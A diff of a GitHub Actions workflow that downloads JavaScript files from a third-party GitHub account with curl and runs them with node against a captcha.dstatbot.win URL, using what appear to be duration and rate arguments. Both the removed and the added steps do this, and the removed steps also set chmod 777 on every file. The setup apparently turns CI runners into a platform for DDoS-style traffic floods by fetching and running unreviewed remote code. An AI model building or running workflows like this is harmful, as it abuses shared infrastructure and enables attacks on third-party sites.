@@ -8,12 +8,8 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
       - name: Lệnh #1
-        run: npm i hpack puppeteer-real-browser
+        run: npm i puppeteer-real-browser
       - name: Lệnh #2
-        run: chmod 777 *
+        run: curl -L -o c3.js https://github.com/occhoahihihih/helloworld/raw/refs/heads/main/c3.js
       - name: Lệnh #3
-        run: curl -L -o c1.js https://raw.githubusercontent.com/occhoahihihih/helloworld/main/c1.js
-      - name: Lệnh #4
-        run: curl -L -o c2.js https://raw.githubusercontent.com/occhoahihihih/helloworld/main/c2.js
-      - name: Lệnh #5
-        run: node c1 https://captcha.dstatbot.win/740dd9d1-be78-47c9-9eb9-672064d7ed13 260 1 8
+        run: node c3 https://captcha.dstatbot.win/2f26ea5c-e00a-4e4d-b031-6508b174e75e 260 2
